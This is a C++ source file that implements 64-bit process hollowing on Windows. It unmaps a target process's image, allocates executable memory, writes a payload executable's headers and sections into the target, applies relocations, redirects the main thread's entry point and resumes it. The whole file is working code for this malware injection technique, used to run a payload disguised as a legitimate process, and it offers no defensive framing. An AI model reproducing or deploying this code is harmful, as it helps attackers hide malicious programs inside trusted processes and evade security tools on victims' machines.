#include "Hollowing64Bit.hpp"
#include "NtdllFunctions.hpp"
#include <Windows.h>
#include <string>
#include <Ntsecapi.h>
#include <DbgHelp.h>
#include <stdint.h>
#include <iostream>
#include "exceptions/IncompatibleImagesException.hpp"
#include "exceptions/ImageWindowsBitnessException.hpp"
#include "exceptions/HollowingException.hpp"

const std::string RELOCATION_SECTION_NAME = ".reloc";

Hollowing64Bit::Hollowing64Bit(const std::string& targetPath, const std::string& payloadPath) :
    HollowingInterface(targetPath, payloadPath)
{
    if (!IsWindows64Bit())
    {
        throw ImageWindowsBitnessException("Cannot work with 64 bit images on a 32 bit Windows build!");
    }
    
    ValidateCompatibility();
}

void Hollowing64Bit::hollow()
{
    DEBUG(std::cout << "PID: " << _targetProcessInformation.dwProcessId << std::endl);

    PEB64 targetPEB = Read64BitProcessPEB(_targetProcessInformation.hProcess);

    const PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    const PIMAGE_NT_HEADERS64 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(_payloadBuffer + payloadDOSHeader->e_lfanew);

    if (0 != NtdllFunctions::_NtUnmapViewOfSection(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(targetPEB.ImageBaseAddress)))
    {
        throw HollowingException("An error occured while unmapping the target's memory!");
    }
    PVOID targetNewBaseAddress = VirtualAllocEx(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(targetPEB.ImageBaseAddress),
        payloadNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(nullptr == targetNewBaseAddress)
    {
        throw HollowingException("An error occured while allocating new memory for the target!");
    }

    DEBUG(std::cout << "New base address: " << std::hex << targetNewBaseAddress << std::endl);

    WriteTargetProcessHeaders(targetNewBaseAddress, _payloadBuffer);

    UpdateTargetProcessEntryPoint(reinterpret_cast<PBYTE>(targetNewBaseAddress) + payloadNTHeaders->OptionalHeader.AddressOfEntryPoint);

    ULONGLONG delta = reinterpret_cast<intptr_t>(targetNewBaseAddress) - payloadNTHeaders->OptionalHeader.ImageBase;
    DEBUG(std::cout << "Delta: " << std::hex << delta << std::endl);
    if(0 != delta)
    {
        RelocateTargetProcess(delta, targetNewBaseAddress);
        
        UpdateBaseAddressInTargetPEB(targetNewBaseAddress);
    }

    DEBUG(std::cout << "Resuming the target's main thread" << std::endl);
    
    NtdllFunctions::_NtResumeThread(_targetProcessInformation.hThread, nullptr);

    _hollowed = true;
}

void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE sourceFileContents)
{
    const PIMAGE_DOS_HEADER sourceDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(sourceFileContents);
    const PIMAGE_NT_HEADERS64 sourceNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(sourceFileContents + sourceDOSHeader->e_lfanew);

    DEBUG(std::cout << "Writing headers" << std::endl);

    DWORD oldProtection = 0;
    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || sourceNTHeaders->OptionalHeader.SizeOfHeaders != writtenBytes)
    {
        throw HollowingException("An error occured while writing the payload's headers to the target!");
    }
    // Updating the ImageBase field
    if(0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<LPBYTE>(targetBaseAddress) + sourceDOSHeader->e_lfanew +
        offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER64, ImageBase), &targetBaseAddress,
        sizeof(ULONGLONG), &writtenBytes) || sizeof(ULONGLONG) != writtenBytes)
    {
        throw HollowingException("An error occured while updating the ImageBase field!");
    }
    if (0 == VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
        PAGE_READONLY, &oldProtection))
    {
        throw HollowingException("An error occured while changing the target's sections' page permissions!");
    }

    for (int i = 0; i < sourceNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(sourceFileContents + sourceDOSHeader->e_lfanew +
            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
        DEBUG(std::cout << "Writing " << std::string(reinterpret_cast<char*>(currentSection->Name)) << std::endl);

        if (ERROR_SUCCESS != NtdllFunctions::_NtWriteVirtualMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(targetBaseAddress) +
            currentSection->VirtualAddress), (sourceFileContents + currentSection->PointerToRawData),
            currentSection->SizeOfRawData, nullptr))
        {
            throw HollowingException("An error occured while writing a payload's section to the target!");
        }

        if (0 == VirtualProtectEx(_targetProcessInformation.hProcess, targetBaseAddress, sourceNTHeaders->OptionalHeader.SizeOfHeaders,
            SectionCharacteristicsToMemoryProtections(currentSection->Characteristics), &oldProtection))
        {
            throw HollowingException("An error occured while changing a section's page permissions!");
        }
    }
}

void Hollowing64Bit::UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress)
{
    CONTEXT64 threadContext;
    threadContext.ContextFlags = CONTEXT64_ALL;

    if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        throw HollowingException("An error occured while getting the target's thread context!");
    }

    threadContext.Rcx = reinterpret_cast<intptr_t>(newEntryPointAddress);

    if (0 == SetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        throw HollowingException("An error occured while setting the target's thread context!");
    }
}

PIMAGE_DATA_DIRECTORY Hollowing64Bit::GetPayloadDirectoryEntry(DWORD directoryID)
{
    const PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    const PIMAGE_NT_HEADERS64 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(_payloadBuffer + payloadDOSHeader->e_lfanew);

    return &(payloadNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]);
}

PIMAGE_SECTION_HEADER Hollowing64Bit::FindTargetProcessSection(const std::string& sectionName)
{
    const PIMAGE_DOS_HEADER payloadDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(_payloadBuffer);
    const PIMAGE_NT_HEADERS64 payloadNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(_payloadBuffer + payloadDOSHeader->e_lfanew);
    char maxNameLengthHolder[IMAGE_SIZEOF_SHORT_NAME + 1] = { 0 };  // According to WinAPI, the name of the section can
                                                                    // be as long as the size of the buffer, which means
                                                                    // it won't always have a terminating null byte, so
                                                                    // we include a spot for one at the end by ourselves.

    for (int i = 0; i < payloadNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER currentSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(_payloadBuffer + payloadDOSHeader->e_lfanew +
            sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));

        if (0 != currentSectionHeader->Name[IMAGE_SIZEOF_SHORT_NAME - 1])
        {
            strncpy(maxNameLengthHolder, reinterpret_cast<char*>(currentSectionHeader->Name), IMAGE_SIZEOF_SHORT_NAME);
        }
        else
        {
            int nameLength = strlen(reinterpret_cast<char*>(currentSectionHeader->Name));
            strncpy(maxNameLengthHolder, reinterpret_cast<char*>(currentSectionHeader->Name), nameLength);
            maxNameLengthHolder[nameLength] = 0;
        }

        if (0 == strcmp(sectionName.c_str(), maxNameLengthHolder))
        {
            return currentSectionHeader;
        }
    }

    return nullptr;
}

void Hollowing64Bit::RelocateTargetProcess(ULONGLONG baseAddressesDelta, PVOID processBaseAddress)
{
    PIMAGE_DATA_DIRECTORY relocData = GetPayloadDirectoryEntry(IMAGE_DIRECTORY_ENTRY_BASERELOC);
    DWORD dwOffset = 0;
    PIMAGE_SECTION_HEADER relocSectionHeader = FindTargetProcessSection(RELOCATION_SECTION_NAME);

    if (nullptr == relocSectionHeader)
    {
        throw HollowingException("The payload must have a relocation section!");
    }

    DWORD dwRelocAddr = relocSectionHeader->PointerToRawData;

    while (dwOffset < relocData->Size)
    {
        PBASE_RELOCATION_BLOCK pBlockHeader = reinterpret_cast<PBASE_RELOCATION_BLOCK>(&_payloadBuffer[dwRelocAddr + dwOffset]);

        DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);

        PBASE_RELOCATION_ENTRY pBlocks = reinterpret_cast<PBASE_RELOCATION_ENTRY>(&_payloadBuffer[dwRelocAddr + dwOffset + sizeof(BASE_RELOCATION_BLOCK)]);

        ProcessTargetRelocationBlock(pBlockHeader, pBlocks, processBaseAddress, baseAddressesDelta);

        dwOffset += pBlockHeader->BlockSize;
    }
}

void Hollowing64Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRelocationBlock, PBASE_RELOCATION_ENTRY blockEntries,
    PVOID processBaseAddress, ULONGLONG baseAddressesDelta)
{
    DWORD entriesAmount = CountRelocationEntries(baseRelocationBlock->BlockSize);

    for (DWORD i = 0; i < entriesAmount; i++)
    {
        // The base relocation is skipped. This type can be used to pad a block.
        if (IMAGE_REL_BASED_ABSOLUTE != blockEntries[i].Type)
        {
            DWORD dwFieldAddress = baseRelocationBlock->PageAddress + blockEntries[i].Offset;
            ULONGLONG addressToFix = 0;
            SIZE_T readBytes = 0;
            if (0 == ReadProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
                &addressToFix, sizeof(addressToFix), &readBytes)  || sizeof(addressToFix) != readBytes)
            {
                throw HollowingException("An error occured while reading the address to relocate from the target!");
            }
            
            addressToFix += baseAddressesDelta;

            SIZE_T writtenBytes = 0;
            if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, (reinterpret_cast<PBYTE>(processBaseAddress) + dwFieldAddress),
                &addressToFix, sizeof(addressToFix), &writtenBytes) || sizeof(addressToFix) != writtenBytes)
            {
                throw HollowingException("An error occured while writing the relocated address to the target!");
            }
        }
    }
}

void Hollowing64Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
{
    CONTEXT64 threadContext;
    threadContext.ContextFlags = CONTEXT64_ALL;

    if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
    {
        throw HollowingException("An error occured while getting the target's thread context!");
    }

    SIZE_T writtenBytes = 0;
    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(threadContext.Rdx + offsetof(PEB64, ImageBaseAddress)),
        &processNewBaseAddress, sizeof(ULONGLONG), &writtenBytes) || sizeof(ULONGLONG) != writtenBytes)
    {
        throw HollowingException("An error occured while writing the new base address in the target's PEB!");
    }
}

ULONG Hollowing64Bit::GetProcessSubsystem(HANDLE process)
{
    PEB64 processPEB = Read64BitProcessPEB(process);
    
    return processPEB.ImageSubsystem;
}

WORD Hollowing64Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
{
    const PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(fileBuffer);
    const PIMAGE_NT_HEADERS64 ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(fileBuffer + dosHeader->e_lfanew);
    
    return ntHeaders->OptionalHeader.Subsystem;
}

void Hollowing64Bit::ValidateCompatibility()
{
    WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);

    if (!_isTarget64Bit || !_isPayload64Bit)
    {
        throw IncompatibleImagesException(!_isTarget64Bit ? "The target is not 64-bit!" : "The payload is not 64-bit!");
    }

    if (!(IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem ||
        payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)))
    {
        throw IncompatibleImagesException("The processes' subsystem aren't the same, or the payload's subsystem is not GUI!");
    }
}